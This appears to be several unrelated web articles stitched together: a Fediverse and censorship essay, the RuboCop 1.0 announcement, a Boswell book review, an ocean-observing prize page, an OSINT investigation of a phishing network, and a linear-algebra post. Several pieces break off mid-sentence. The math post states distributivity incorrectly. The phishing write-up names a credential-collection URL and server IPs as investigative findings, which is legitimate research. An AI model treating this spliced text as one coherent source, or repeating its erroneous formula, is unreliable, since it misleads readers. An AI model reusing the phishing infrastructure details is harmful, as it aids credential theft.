<p>People are calling for reform to Section 230 of the Communication Decency Act<sup id="fnref:5"><a href="#fn:5">4</a></sup>, the law that keeps Internet platforms from liabilities often reserved for publishers. However, I do not believe more legal restrictions will solve the issues surrounding tech and free speech. The only viable solution is better use of technology. The Internet was not founded by media giants. It was originally hundreds of thousands of small, independent websites and service providers. The solution to our current censorship woes, lies in the archives of Internet next to animated hamsters, under construction GIFs, and bright pink animated Geocities sites.</p>

<p>The Internet of the 90s was a place of wonder. I started my journey on the Internet using a dial-up modem on a Windows 3.1 PC with Trumpet WinSock. Netscape Navigator was a far cry from the ANSI art and RIP graphics of bulletin boards. I started creating and editing websites with Netscape Composer, before eventually writing my own HTML. Some of my <a href="https://battlepenguin.com/tech/a-history-of-personal-and-professional-websites/#high-school-the-web-in-the-late-90s">very first websites</a> were run from a computer under a desk in my cousin’s cubicle. Meanwhile, many of my friends were experiencing the early Internet through American On-Line. With its keywords, chat rooms and instant messaging, its built in web browser felt like more of an afterthought. Even though AOL eventually implemented their own WinSock layer, allowing traditional Internet applications and browsers, AOL would lose relevance under a mountain of free trial CDs, as people moved on to local dial-up and broadband Internet service providers (ISPs).</p>

<p>Every broadcast format started with a free flow of information. At one time, newspapers were run cheaply and independently, spreading information via travelers from town to town. Radio was an open medium as well, with people independently hosting all kinds of news, music and religious programming, before the FCC began splitting up and regulating frequencies<sup id="fnref:1"><a href="#fn:1">5</a></sup>. The Internet shouldn’t suffer from the same limitations as radio or TV broadcasts. Where those frequencies were limited and needed to be sliced up, the Internet allows direct point-to-point communication between individuals and servers, with vastly scalable bandwidth capacities. Members of the tech community have long pushed for Network Neutrality legislation, with fears that major network backbone providers would limit the quality of service for independent websites.</p>

<p>However, there is another major factor in controlling the flow of information the Internet: the growth and prominence of Internet megasites. Although I recently <a href="https://battlepenguin.com/tech/moving-from-youtube-to-peertube/">copied all my videos to my private PeerTube server</a>, independent video sites do not have the scale and discoverability of YouTube. Although I only use Facebook and Twitter to promote material I host outside of those websites, by not interacting with people via those platforms, my content doesn’t have the same reach due to the black box of social media algorithms and the <a href="https://battlepenguin.com/tech/facebook-and-the-silent-bob-effect/">silent bob effect</a>.</p>

<h3 id="censorship">Censorship</h3>

<p>In the United States, our Bill of Rights protects the <a href="https://battlepenguin.com/politics/why-i-no-longer-hate-america/#the-freedom-to-speak">speech of individuals against censorship from the government</a>. However, private companies are allowed to exercise control over their own platforms. When it comes to Facebook, Twitter, YouTube and even Reddit, their reach is absolutely massive. When the New York Post broke its article about Hunter Biden, Facebook said it was “reducing its distribution” on their platform<sup id="fnref:6"><a href="#fn:6">6</a></sup>. Twitter blocked the New York Post from accessing their own accounts, along with several others who reposted the article. Twitter also blocked direct messaging of the article, and even listed the Republican Judiciary Committee’s official website as being <em>unsafe</em> when the House posted their own response to the Biden investigation.</p>

<p>In July, Reddit banned over 2,000 communities<sup id="fnref:15"><a href="#fn:15">7</a></sup>. Discord has started shutting down communities for misinformation<sup id="fnref:16"><a href="#fn:16">8</a></sup>. On October 15th, YouTube purged dozens of channels<sup id="fnref:7"><a href="#fn:7">9</a></sup>. Many of these channels had over 100,000 subscribers, and the total count for all the subscriptions lost was over 7 million<sup id="fnref:8"><a href="#fn:8">10</a></sup>. Even though these voices have not been censored by a government entity, <a href="https://battlepenguin.com/politics/the-new-era-of-corporate-censorship/">corporate censorship</a> is still censorship. Furthermore, we are now seeing corporations limiting access to information provided by the government, pushing narratives that further their agenda, and overtly influencing, if not downright interfering, in the <a href="https://battlepenguin.com/politics/video/does-voting-make-a-difference/">American election process</a>.</p>

<blockquote>
  <p><em>“Where we’re seeing [arrogance] now, where it is the most frightening of all is the god damn tech sector. Right? These people actually think that they know what is true, with sufficient clarity, that they’re going to go about labeling beliefs as false … for example … We highlighted two heterodox papers about COVID on our last live stream. Now one of them I must say I have some trepidations about; the Yan paper. But the Yan paper makes arguments that one can evaluate. Now some of those arguments, I think, raise questions … and in fact, I’ve gotten some correspondence from people who spotted various things that seem wrong … Nonetheless, the tech sector has decided, ‘Well this is dangerous information’ and they have suspended her [Twitter] account…and they’re forbidding the posting of the paper or labeling it misinformation…“</em> -Bret Weinstein, DarkHorse Podcast<sup id="fnref:12"><a href="#fn:12">11</a></sup></p>
</blockquote>

<p>The hubris of the tech sector is especially troubling when it comes to deciding what facts are true or scientific. In July, Dr. Li-Meng Yan, a doctor who specialized in virology and immunology at the Hong Kong School of Public Health, accused the Chinese government of covering up information about COVID19 including early reports of human-to-human transmission<sup id="fnref:13"><a href="#fn:13">12</a></sup>. In September, Twitter suspended Yan’s account, in response to her claims of a lab origin for the SARS-CoV2 virus<sup id="fnref:14"><a href="#fn:14">13</a></sup>. Such claims can be open to discussion and examination, but the big technology companies show their arrogance by proclaiming their knowledge as the <em>truth</em>. This has led to <a href="https://battlepenguin.com/politics/this-is-not-a-time-of-honor/#censorship">censorship of any dissenting viewpoints, even by other medical professionals</a>.</p>

<p>In George Orwell’s novel <em>1984</em>, the <em>Ministry of Truth</em> was a government organization that edited the past to fit the current state of the major political party. In today’s world, the <em>Ministry of Truth</em> is analogous to the technology sector. The fact checks they place on posts and content are pure arrogance. They are essentially telling the world, “You are too stupid to do your own analysis, so we will tell you what to think.”</p>

<h3 id="technology-as-a-solution">Technology as a Solution</h3>

<blockquote>
  <p><em>“The Net interprets censorship as damage and routes around it.”</em> -John Gilmore<sup id="fnref:9"><a href="#fn:9">14</a></sup></p>
</blockquote>

<p>There are many centralized alternatives to the big platforms. Facebook has bought several of them including WhatsApp and Instagram. There are also several decentralized platforms that are independently run, yet can communicate with one another. I currently run <a href="https://battlepenguin.video/">my own PeerTube</a> server, a <a href="https://hitchhiker.social/@djsumdog">Mastodon Instance</a> and a <a href="https://djsumdog.com/@djsumdog">Pleroma+SoapBox server</a>. These are platforms running open source software, which I host on servers I pay for. They can communicate with each other using a protocol called ActivityPub, which can be thought of as an e-mail (SMTP) protocol, but for social networking. They obviously do not have the reach of the big players, but they are capable alternatives which use the technology of the Internet to route around the censorship of big tech.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/sol-to-fb-twitter/fedi-expectation-reality.png" alt="Fediverse Logo with Connected Graph (Expected) next to Fediverse Logo with Broken Graph (Reality)">
  
  
</figure>

<p>Obviously, these platforms have issues as well. People who run servers often block certain lists of servers they may not agree with. There is censorship and there are echo chambers within this system of federated social networking servers (colloquially known to many as The Fediverse). However, if you are unhappy with the way a particular server’s administrator is moderating posts or choosing what servers to communicate with, you can create an account on another server instead. If you have the technical background or are willing to learn, you can set up your own server. Unlike Reddit or Discord, one organization doesn’t control every single community. Each community is individually funded and hosted, making them difficult to censor.</p>

<h3 id="put-in-the-effort">Put in the Effort</h3>

<p>I’ve given a few friends invitations to my servers. I try not to be a Fediverse evangelist, as trying to get people to embrace it had similar results to promoting Linux as a desktop operating system back in the 90s and early 2000s. Many people who join a Mastodon server may be overwhelmed by the Federated Timeline. Fenollosa, an engineer out of Barcelona, recommends that people look at the local time lines of different servers, finding one that fits their interests and tastes<sup id="fnref:10"><a href="#fn:10">15</a></sup>.</p>

<p>Still, many people are persuaded to join other centralized platforms after their accounts, or communities they follow, are banned. This creates a diaspora of Internet users from some platforms, often with specific politics or directed anger. This can lead to alternative centralized platforms such as Voat, which become <a href="https://battlepenguin.com/tech/voat-what-went-wrong/">one-sided and polarized</a>. Gab was such a platform, and after getting banned from both the Google and Apple app stores<sup id="fnref:11"><a href="#fn:11">16</a></sup>, attempted a short run of joining the Fediverse. Their platform was met with heavy resistance, blocked from most servers and Fediverse apps and, for better or worse, eventually defederated themselves.</p>

<p>We are in an unprecedented era of large scale news and information bias by the large media and technology …</p></article></section></div></div>

    <blockquote>
  <p>If at first you don’t succeed, call it version 1.0.</p>
</blockquote>

<p>RuboCop’s development started exactly 7 and half years ago. I made
<a href="https://github.com/rubocop-hq/rubocop/commit/afbead34db54506c12a21dbd4ce04fada0f8b9a4#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947">the first
commit</a>
on April 21, 2012. That’s a lot of time in general, but even more in
the fast moving world of IT. During this long period we’ve racked up some
impressive numbers:</p>

<ul>
  <li><strong>9905</strong> commits</li>
  <li><strong>152</strong> releases</li>
  <li>around <strong>3500</strong> closed issues</li>
  <li>almost <strong>5000</strong> merged pull requests</li>
  <li>over <strong>120 million</strong> downloads</li>
  <li>over <strong>200</strong> publicly available related gems (extensions, custom configurations, etc)</li>
  <li>over <strong>700</strong> contributors</li>
</ul>

<p>I never expected any of this on April 21, 2012. If there’s a person truly
surprised by the success of RuboCop that’d be me. But wait, there’s more!
We also reached some important milestones in the last couple of years:</p>

<ul>
  <li>Created the <a href="https://github.com/rubocop-hq">RuboCop HQ organization</a> that became the home for RuboCop, the community style guides, and many popular RuboCop extensions</li>
  <li>Extracted the Rails cops to a separate gem (<code>rubocop-rails</code>)</li>
  <li>Extracted the performance cops to a separate gem (<code>rubocop-performance</code>)</li>
  <li>Extracted the AST-related functionality to a separate gem (<code>rubocop-ast</code>)</li>
  <li>Created new extensions focused on Rake (<code>rubocop-rake</code>) and Minitest (<code>rubocop-minitest</code>)</li>
  <li>Made significant improvements to RuboCop’s code formatting capabilities</li>
  <li>Reworked the cop API</li>
  <li>Switched to safe-only cops by default</li>
  <li>Introduced the notion of “pending” cops</li>
  <li>Created a brand new <a href="https://docs.rubocop.org/">documentation site</a></li>
  <li>Provided more polished versions of the community style guides over at <a href="https://rubystyle.guide/">https://rubystyle.guide</a></li>
</ul>

<p>One thing eluded us, though - a “stable” RuboCop release. Today this finally changes with
RuboCop 1.0!<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>There’s nothing ground-breaking about the new RuboCop release - it’s almost the same as RuboCop 0.93.1 that
preceded it. I believe the only change, that most of you are going to notice, is that all cops that used to be
“pending” are now enabled by default, which is in line with our release policy. No new cops will be enabled
by default until RuboCop 2.0.</p>

<p>The big news for end users and maintainers of extensions is that we’re finally embracing fully Semantic Versioning, which
should make the upgrade process simpler (painless?) for everyone. Going forward the following things will happen only on major releases:</p>

<ul>
  <li>enabling of new cops</li>
  <li>changes to the default cop configuration</li>
  <li>breaking API changes</li>
</ul>

<p>It’s really funny that I felt for at least a couple of years that we were very close to the 1.0
release, only to come up with more and more things I wanted to include in it. I believe <a href="https://rubykaigi.org/2018/presentations/bbatsov.html">I first spoke</a>
about my intentions to ship RuboCop 1.0 at RubyKaigi 2018 and back then I truly believed this was bound to happen in the next
6 months. Classic example of planning in the software development world, right?</p>

<p>Many people urged me for years to label a random release as 1.0 with
the argument that if some software is useful and widely used than it
probably deserves that magic moniker. It’s not a bad argument and I
totally understood the perspective of those people. I, however, was
not convinced as for me version 1.0 also stands for “we got to a place
we consider feature complete and aligned with our vision”.  Needless
to say - the vision we (RuboCop’s team) had was quite ambitious and it took us
a while to make it a reality.</p>

<p>I cannot begin to explain how happy I am that we got here, and I can
assure you that it wasn’t easy.  Over the years RuboCop had its ups
and downs, it got a lot of praise, but also a lot of flak.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Some
days I was super pumped and motivated to work on it, on other days I
couldn’t stand to think about it.  Working on popular OSS projects is
one of the most rewarding and most frustrating experiences that one
can have.  I was (un)fortunate enough to be involved in a few of those
(RuboCop, CIDER, nREPL, Projectile, Emacs Prelude, etc) and each one
was a crazy roller-coaster ride.</p>

<p>I find it funny how my role in RuboCop evolved with time. Originally I
used to write mostly code, these days I write mostly tickets,
issue/code review comments and documentation. Often I feel more like a
project manager rather than a programmer. There was a time when I was
super happy to see a PR and I’d immediately respond to it, now I can’t
keep up with all the PRs. In fact, our entire team can’t keep up with
them, so consider this my apology that it sometimes takes a while to
get feedback on your suggestions. I’ll even admit that I rarely read
issue tickets these days as there are so many of them and it’s
impossible for me to respond to all of them. I’ve just learned that
important tickets always get noticed, if not by me than by someone else from our
fantastic team.</p>

<p>I want to extend special thanks to RuboCop’s core team, as we would have never gotten so far without all those amazing people
working tirelessly on the project:</p>

<ul>
  <li><a href="https://github.com/jonas054">Jonas Arvidsson</a></li>
  <li><a href="https://github.com/yujinakayama">Yuji Nakayama</a> (retired)</li>
  <li><a href="https://github.com/edzhelyov">Evgeni Dzhelyov</a> (retired)</li>
  <li><a href="https://github.com/drenmi">Ted Johansson</a></li>
  <li><a href="https://github.com/pocke">Masataka Kuwabara</a></li>
  <li><a href="https://github.com/koic">Koichi Ito</a></li>
  <li><a href="https://github.com/darhazer">Maxim Krizhanovski</a></li>
  <li><a href="https://github.com/bquorning">Benjamin Quorning</a></li>
  <li><a href="https://github.com/marcandre">Marc-André Lafortune</a></li>
</ul>

<p>You rock, guys!</p>

<p>Jonas, in particular, deserves just as much credit for RuboCop existing today as me. He was the first contributor to RuboCop and he
pushed me to get RuboCop to the state where it got critical mass, mindshare and some traction. It’s a long story for another day and another article.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>Koichi also deserves a special mention for his tireless work and incredible dedication to RuboCop and its users over the years! And for his great karaoke skills!
He has also been a fantastic head maintainer for key RuboCop extensions like <code>rubocop-rails</code>, <code>rubocop-performance</code> and <code>rubocop-minitest</code>.</p>

<p>Last, but not least - another round of big thanks for all the people who contributed to RuboCop in any capacity over the years! RuboCop is all of you!
Keep those contributions coming!</p>

<p>Some closing notes:</p>

<ul>
  <li>As mentioned above, recently we’ve extracted RuboCop’s AST-related logic to the <a href="https://github.com/rubocop-hq/rubocop-ast">rubocop-ast</a> gem, that’s going to be very handy for everything looking to supercharge
<a href="https://github.com/whitequark/parser">parser</a>’s API. I’d love to see more tools using it, as I think we really managed to simplify the interaction with an AST. Work on the new gem is led by the awesome Marc-André Lafortune. By the way, he released <code>rubocop-ast</code> 1.0 today! We have some cause for double celebration!</li>
  <li>The cop API was completely reworked recently by Marc-André. He did some truly fantastic work there! Check out the <a href="https://docs.rubocop.org/rubocop/v1_upgrade_notes.html">upgrade notes</a> if you maintain any RuboCop extensions, as the legacy API will be removed
in RuboCop 2.0.</li>
  <li>We’ve made some changes to how department names are calculated that might affect some extensions. Read more about them <a href="https://github.com/rubocop-hq/rubocop/pull/8490">here</a>.</li>
  <li>Check out the <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.0.0">release notes</a> for all the details.</li>
  <li><code>rubocop-rspec</code> is currently not compatible with RuboCop 1.0, but we’re working on this. You can follow the progress on that front <a href="https://github.com/rubocop-hq/rubocop-rspec/issues/1051">here</a>.</li>
</ul>

<p>And that’s a wrap!</p>

<p>I feel a bit sorry for disappointing everyone who hoped we’d make it
to RuboCop 0.99, before cutting RuboCop 1.0. We did our best and we
had a great 0.x run, but we ran out of things to do.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup> :-) On the bright side - now
I can finally say that I’ve got 99 problems (and 200 open issues), but cutting RuboCop 1.0 ain’t one.</p>

<p>Enjoy RuboCop 1.0 and share with us your feedback about it! Our focus now shifts to RuboCop 1.1, and I hope that we’ll be dropping
new major releases rather infrequently going forward (although RuboCop 2.0 will probably arrive in less than 7 years). Thanks for your help, love, feedback and
support! Keep hacking!</p>

<p><strong>P.S.</strong> Koichi recently covered in great details our long journey to RuboCop 1.0 in his presentation <a href="https://speakerdeck.com/koic/road-to-rubocop-1-dot-0">Road to RuboCop 1.0</a> at RubyKaigi 2020. I cannot recommend it highly enough to those of you who’d like to learn more about the technical aspects of RuboCop 1.0 and all the challenges we had to solve along the way!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn10521873804" rel="footnote"><sup id="fnref10521873804">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn10521873805" rel="footnote"><sup id="fnref10521873805">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

                  The Powering the Blue Economy™: Ocean Observing Prize challenges innovators to integrate marine renewable energy with ocean observation platforms, ultimately revolutionizing our ability to collect the data needed to understand, map, and monitor the ocean.

                  This joint prize between the Water Power Technologies Office (WPTO) at the U.S. Department of Energy and the Integrated Ocean Observing System (IOOS®) Office at the National Oceanic and Atmospheric Administration (NOAA) seeks to develop new technologies that can help fill the data gaps making it difficult to realize the full potential of the Blue Economy. The Ocean Observing Prize includes a series of competitions with millions of dollars in awards to encourage rapid innovation in the fields of marine energy and ocean observations, that began with the DISCOVER Competition and is followed by the DEVELOP Competition. The Pacific Northwest National Laboratory and the National Renewable Energy Laboratory are supporting DOE and NOAA on the development and administration of the prize.

              <p>
                The Ocean Observing Prize is a series of competitions with cash awards to incentivize accelerated advancement of ideas from concept to demonstration. The first competition, the DISCOVER Competition, closed on February 12, 2020. Competitors submitted novel concepts that integrate ocean observing technologies with marine energy systems to address end-user needs across five broad themes: (1) Unmanned Vehicles; (2) Communications and Underwater Navigation; (3) Extreme Environments; (4) Buoys, Floats, and Tags; and (5) Blue Sea Ideas (i.e. other). Following the DISCOVER Competition, the DEVELOP Competition focuses on a single theme, <a href="https://americanmadechallenges.org/oceanobserving/develop.html">hurricane monitoring</a>, and challenges contestants to develop their ideas into a functioning prototype through three contests: DESIGN, BUILD, and SPLASH. Together, the DISCOVER and DEVELOP Competitions will award up to $3 million in cash prizes as well as other in-kind awards.
              </p>
              <p>
                The Ocean Observing Prize is repeatable, and it is expected that future iterations may focus on other themes. Through this competition, innovators will be able to tap into DOE and NOAA’s network of National Laboratories, energy incubators and accelerators, subject matter experts, and other resources across the nation to build novel technologies that collect critical ocean data.

<p>Today’s OSINT investigation involves a talented young hacker, who slowly turned into the operator of a large-scale phishing network. What we found on the surface is a story of a happy father, who facilitates identity theft when nobody is looking. In this article, we demonstrate how we managed to track down the operator of this phishing operation called ‘Bulletproftlink’.</p>

<p>As usual, it all started with a phishing email impersonating a Sydney-based accounting firm. The email came from an accountant and it looked reasonable legitimate. There was <a rel="nofollow noopener noreferrer" target="_blank" href="https://blog.ironbastion.com.au/why-outdated-anti-phishing-advice-leaves-you-exposed-part-1/">no sign of broken English or a spoofed email sender</a>, the message looked rather convincing.</p>

<p>The <code>Remittance Advice receipts.pdf</code> link took me to a downloadable HTML file hosted on Dropbox. Once we did go down the rabbit hole, the link redirections ultimately led us to a fake login page served from the Google Cloud Storage platform.</p>
<p>It was a password-stealing page, a pixel-perfect clone of the Microsoft login page. If a victim enters their password on this page, the login credentials are sent straight to the criminals rather than Microsoft. These passwords are usually end up on the black market for those being in the business of identity theft.</p>

<h2 id="where-did-the-passwords-go">Where did the passwords go?</h2>
<p>The following step was the dissection of the fake login page to see where the victims’ password is transmitted.</p>
<p>Although the phishing page was featuring some level of code obfuscation, we did not have to fire up the Burp Suite this time. This time, the code inspector was enough to reveal that the destination of the stolen passwords was <code>https://moneysmtp.com/email-list/office365nw/finish.php</code>.</p>

<p>The next stage was poking around on this page capturing the passwords.</p>
<p>When we punched the URL into a web browser, the remote end responded with a simple <code>OK</code> message. Unfortunately, the HTTP headers did not reveal that much either. The root page at <code>https://moneysmtp.com/</code> did not show too much either apart from a reference to Vesta Control Panel, a popular application within server hosting circles.</p>

<p>The breakthrough came when we ran an <strong>IPv4 Hosts</strong> search for the domain name on Censys. The search query returned two IP addresses associated with ‘moneysmtp.com’: <code>62.149.20.89</code> and <code>62.149.20.90</code>.</p>

<p>First, we thought this was a good lead, as the two IP addresses seem to belong to <code>7Heaven LLC (7h.com.ua)</code>, a no-questions-asked server hosting provider in Ukraine. Little did we know, this was a dead-end, and the traces were leading to Asia instead.</p>

<p>Following a brief look into 7Heaven LLC that led nowhere, we went back to Censys to run a different query.</p>
<p>This time, however, we searched within the <strong>Certificates</strong> category, and voilà, there was an email address associated with our adversary: <code><a href="https://osint.fans/cdn-cgi/l/email-protection" data-cfemail="1e6a767b796c7b7b70736726295e79737f7772307d7173">[email&nbsp;protected]</a></code>.</p>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
  its subfields, so \( \mathbb{R} \) must be a vector space over \(
  \mathbb{Q}. \)
</p>


<h2 id="problem"><a href="#problem">Problem</a></h2>

<p>
Here is an interesting problem related to vector spaces that I came
